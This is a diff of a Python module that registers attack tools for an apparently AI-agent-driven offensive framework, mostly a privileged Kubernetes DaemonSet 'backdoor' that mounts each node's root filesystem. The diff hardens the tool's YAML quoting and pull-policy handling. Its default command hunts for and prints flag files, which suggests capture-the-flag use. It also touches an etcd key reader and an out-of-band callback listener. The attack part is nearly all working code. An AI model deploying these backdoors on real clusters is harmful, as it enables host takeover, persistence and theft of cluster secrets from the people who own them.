             "endpoint": {"type": "string", "description": "etcd endpoint URL (e.g. 'http://localhost:2379', 'https://10.0.0.1:2379')"},
             "key": {"type": "string", "description": "etcd key path to read (default '/' for all keys)"},
-            "prefix": {"type": "boolean", "description": "Use --prefix for recursive key listing (default true)"},
+            "keys_only": {"type": "boolean", "description": "List keys only instead of values (default true)"},
             "insecure": {"type": "boolean", "description": "Skip TLS certificate verification for HTTPS endpoints (default true)"},
             "cacert": {"type": "string", "description": "Path to CA certificate for TLS verification (e.g. /etc/kubernetes/pki/etcd/ca.crt)"},
             "cert": {"type": "string", "description": "Path to client certificate for mutual TLS"},
@@ -5264,8 +5527,9 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     # obtaining cluster-admin or pod creation privileges.
 
     async def k8s_backdoor_daemonset(
-        image: str = "busybox", shell_cmd: str = "cat /host/flag* 2>/dev/null; id",
-        namespace: str = "kube-system",
+        image: str = "busybox",
+        shell_cmd: str = "find /host -maxdepth 5 -name 'flag*' -type f -exec cat {} + 2>/dev/null; id",
+        namespace: str = "kube-system", image_pull_policy: str = "IfNotPresent",
     ) -> ToolResult:
         """Deploy a privileged DaemonSet backdoor on every node.
 
@@ -5276,8 +5540,16 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         Use when: you have cluster-admin or pod-create privileges in kube-system.
         The DaemonSet runs on ALL nodes — use shell_cmd to read flags or deploy
         persistent access.
+
+        Two past failure modes are fixed here: the YAML was assembled with
+        ``echo '...'`` (brittle quoting) and the pod requested a ':latest' image
+        with the implicit Always pull policy, so an image already present on the
+        node failed with ErrImagePull.  If the apply reports ErrImagePull the
+        call retries once with imagePullPolicy=Never and reports the pod's own
+        status/logs.
         """
         ds_name = f"cdk-backdoor-{image.replace(':','-').replace('/','-')}"
+        _args_yaml = _json.dumps(f"{shell_cmd}; sleep 3600")
         yaml_config = f"""apiVersion: apps/v1
 kind: DaemonSet
 metadata:
@@ -5297,8 +5569,9 @@ spec:
       containers:
       - name: backdoor
         image: {image}
+        imagePullPolicy: {image_pull_policy}
         command: ["/bin/sh", "-c"]
-        args: ["{shell_cmd}; sleep 3600"]
+        args: [{_args_yaml}]
         volumeMounts:
         - name: host-root
           mountPath: /host
@@ -5310,30 +5583,54 @@ spec:
           path: /
       restartPolicy: Always
 """
+        manifest_path = f"/tmp/{ds_name}.yaml"
         deploy_cmd = (
-            f"echo '{yaml_config}' > /tmp/{ds_name}.yaml && "
-            f"kubectl apply -f /tmp/{ds_name}.yaml 2>&1; "
+            f"cat > {manifest_path} <<'DARWIN_DS_EOF'\n{yaml_config}DARWIN_DS_EOF\n"
+            f"kubectl apply -f {manifest_path} 2>&1; "
             f"sleep 8 2>/dev/null; "
             f"echo '=== Pod status ===' && "
             f"kubectl get pods -n {namespace} -l app={ds_name} 2>&1; "
             f"echo '=== Pod logs ===' && "
-            f"POD=$(kubectl get pods -n {namespace} -l app={ds_name} -o jsonpath='{{.items[0].metadata.name}}' 2>/dev/null); "
-            f"if [ -n \"$POD\" ]; then kubectl logs -n {namespace} $POD 2>&1; fi; "
-            f"rm /tmp/{ds_name}.yaml 2>/dev/null"
+            f"POD=$(kubectl get pods -n {namespace} -l app={ds_name} "
+            f"-o jsonpath='{{.items[0].metadata.name}}' 2>/dev/null); "
+            f"if [ -n \"$POD\" ]; then kubectl logs -n {namespace} $POD 2>&1; fi"
         )
         result = await _run_shell(deploy_cmd, timeout=60)
-        return ToolResult(tool_name="k8s_backdoor_daemonset", success=True,
-            stdout=result.stdout[:3000], stderr=result.stderr, exit_code=0,
-            elapsed_ms=result.elapsed_ms)
+        combined = result.stdout or ""
+        if "ErrImagePull" in combined or "ImagePullBackOff" in combined:
+            # The image exists on the node but the tag's default pull policy
+            # asked the registry for it.  Retry pinned to the local image.
+            _retry_yaml = yaml_config.replace(
+                f"imagePullPolicy: {image_pull_policy}", "imagePullPolicy: Never",
+            )
+            retry = await _run_shell(
+                f"cat > {manifest_path} <<'DARWIN_DS_EOF'\n{_retry_yaml}DARWIN_DS_EOF\n"
+                f"kubectl apply -f {manifest_path} 2>&1; sleep 8 2>/dev/null; "
+                f"echo '=== Pod status (retry: imagePullPolicy=Never) ===' && "
+                f"kubectl get pods -n {namespace} -l app={ds_name} 2>&1; "
+                f"echo '=== Pod logs ===' && "
+                f"POD=$(kubectl get pods -n {namespace} -l app={ds_name} "
+                f"-o jsonpath='{{.items[0].metadata.name}}' 2>/dev/null); "
+                f"if [ -n \"$POD\" ]; then kubectl logs -n {namespace} $POD 2>&1; fi",
+                timeout=60,
+            )
+            combined = f"{combined}\n{retry.stdout or ''}"
+        return ToolResult(
+            tool_name="k8s_backdoor_daemonset",
+            success=bool(combined.strip()),
+            stdout=combined[:3000], stderr=result.stderr, exit_code=0,
+            elapsed_ms=result.elapsed_ms,
+        )
 
     gateway.register(
         name="k8s_backdoor_daemonset",
         func=k8s_backdoor_daemonset,
-        description="DEPLOY privileged DaemonSet on ALL cluster nodes with host root mounted. Creates a pod on every node that can access the host filesystem via /host. Use when you have cluster-admin access and need host-level access. Start with shell_cmd='cat /host/flag*' to find flags.",
+        description="DEPLOY a privileged DaemonSet on ALL cluster nodes with the node root mounted at /host. Use when you have pod-create rights (cluster-admin) and need host/node files, e.g. node-mounted flag files. The default shell_cmd searches /host for flag files and prints them. Set image to an image that already exists on the node (an image referenced by a running pod) — pulling is not required and the call retries with imagePullPolicy=Never if the kubelet reports ErrImagePull.",
         parameters={
             "image": {"type": "string", "description": "Container image (default 'busybox')"},
             "shell_cmd": {"type": "string", "description": "Command to execute on each node's HOST filesystem (via /host mount)"},
             "namespace": {"type": "string", "description": "Target namespace (default 'kube-system')"},
+            "image_pull_policy": {"type": "string", "description": "imagePullPolicy for the DaemonSet (default IfNotPresent; retried as Never on ErrImagePull)"},
         },
     )
 
@@ -5428,6 +5725,10 @@ spec:
             "name": {"type": "string", "description": "Exact tool name from tool_registry_list."},
         },
     )
+
+    # Out-of-band callback listener (blind/async verification).
+    from darwin.tools.oob_listener import register_oob_tools
+    register_oob_tools(gateway)
 
     # Convert legacy registration metadata into explicit v2 contracts once
     # all tools (including registry meta-tools) are present.
